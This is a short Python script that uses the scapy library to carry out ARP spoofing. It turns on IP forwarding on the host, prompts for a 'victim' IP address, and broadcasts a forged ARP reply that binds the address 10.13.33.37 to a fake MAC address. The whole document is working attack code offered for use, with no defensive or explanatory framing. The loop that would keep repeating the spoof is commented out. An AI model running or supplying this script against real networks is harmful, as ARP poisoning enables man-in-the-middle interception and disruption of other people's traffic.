from scapy.all import ARP, Ether, sendp, srp
import os

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

#print("Enter the victims ip: ")

target_ip = input("Enter the victims ip: ")
fake_ip = "10.13.33.37"
fake_mac = "de:ad:be:ef:ca:fe"

arp_response = Ether( dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=fake_ip, hwsrc=fake_mac, pdst=target_ip)


#while True:
sendp(arp_response, verbose=1)


